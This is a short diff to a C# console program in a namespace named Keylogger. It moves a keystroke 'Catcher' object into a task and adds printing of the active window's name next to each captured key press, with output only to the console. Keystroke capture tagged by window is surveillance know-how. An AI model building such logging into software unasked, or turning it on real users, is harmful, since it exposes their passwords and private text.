@@ -14,10 +14,9 @@ namespace Keylogger
         static ManualResetEvent waitHandle = new ManualResetEvent(false);
         static void Main(string[] args)
         {
-            Catcher catcher;
             Task CatherTask = Task.Factory.StartNew(() =>
             {
-                catcher = new Catcher(20);
+                Catcher catcher = new Catcher(20);
                 catcher.KeyDown += KeyDown;
                 catcher.KeyUp += KeyUp;
                 catcher.Start();
@@ -27,6 +26,7 @@ namespace Keylogger
 
         static void KeyDown(CatcherEventArgs args)
         {
+            Console.WriteLine(args.WindowName);
             Console.WriteLine(args.UnicodeValue + " - Down");
         }
 
